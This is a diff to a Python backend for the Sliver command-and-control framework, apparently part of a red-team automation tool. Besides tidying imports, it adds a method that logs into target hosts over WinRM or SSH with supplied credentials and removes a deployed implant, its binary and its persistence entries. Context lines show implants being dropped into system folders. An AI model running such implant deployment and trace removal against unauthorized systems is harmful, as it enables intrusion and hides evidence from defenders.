@@ -1,9 +1,11 @@
 import asyncio
+import base64
 import os
 import shlex
 import subprocess
 import tempfile
 import time
+import uuid
 from typing import Optional
 
 from .models import C2Session, ImplantConfig, TaskResult, SessionStatus
@@ -31,7 +33,7 @@ class SliverBackend:
             if config_path:
                 config = SliverClientConfig.parse_config_file(config_path)
             elif config_b64:
-                import base64, json
+                import json
                 cfg_data = base64.b64decode(config_b64).decode()
                 config = SliverClientConfig.from_json(cfg_data)
             else:
@@ -171,7 +173,6 @@ class SliverBackend:
             return None
 
         try:
-            import base64, uuid
             b64 = base64.b64encode(implant_bytes).decode()
             remote_path = f"C:\\Windows\\Tasks\\{uuid.uuid4().hex[:8]}.exe"
             ps_cmd = (
@@ -200,7 +201,6 @@ class SliverBackend:
             return None
 
         try:
-            import base64, uuid
             b64 = base64.b64encode(implant_bytes).decode()
             remote_path = f"/tmp/{uuid.uuid4().hex[:8]}"
             from ..kali_tools_client import kali
@@ -215,6 +215,40 @@ class SliverBackend:
         except Exception:
             pass
         return None
+
+    async def cleanup_implant(self, target: str, username: str, password_or_key: str,
+                               remote_path: str, os_type: str = "linux") -> bool:
+        """Remove implant from remote system: kill process, delete binary, remove persistence."""
+        if os_type == "windows":
+            ps_cmd = (
+                f"Stop-Process -Name $(Get-Process | Where-Object {{$_.Path -eq '{remote_path}'}}) -Force -ErrorAction SilentlyContinue; "
+                f"Remove-Item -Force '{remote_path}' -ErrorAction SilentlyContinue; "
+                f"schtasks /Delete /TN 'RaphaelImplant' /F 2>$null; "
+                f"Remove-Item -Force 'C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\raphael_implant.*' -ErrorAction SilentlyContinue"
+            )
+            from ..kali_tools_client import kali
+            result = await kali.run("netexec", (
+                f"winrm {shlex.quote(target)} "
+                f"-u {shlex.quote(username)} -p {shlex.quote(password_or_key)} "
+                f"-X {shlex.quote('powershell -EncodedCommand ' + base64.b64encode(ps_cmd.encode()).decode())}"
+            ), timeout=60)
+            return "error" not in result
+        else:
+            cleanup_script = (
+                f"kill $(fuser {remote_path} 2>/dev/null) 2>/dev/null; "
+                f"dd if=/dev/urandom of={remote_path} bs=1k count=1 2>/dev/null; "
+                f"rm -f {remote_path}; "
+                f"sed -i '/raphael_implant/d' /etc/crontab /var/spool/cron/crontabs/* 2>/dev/null; "
+                f"rm -f /etc/systemd/system/raphael* /etc/init.d/raphael* 2>/dev/null"
+            )
+            ssh_cmd = (
+                f"sshpass -p {shlex.quote(password_or_key)} ssh -o StrictHostKeyChecking=no "
+                f"{shlex.quote(username)}@{shlex.quote(target)} "
+                f"{shlex.quote(cleanup_script)}"
+            )
+            from ..kali_tools_client import kali
+            result = await kali.run("bash", f"-c {shlex.quote(ssh_cmd)}", timeout=60)
+            return "error" not in result
 
     async def stop(self):
         if self._client:
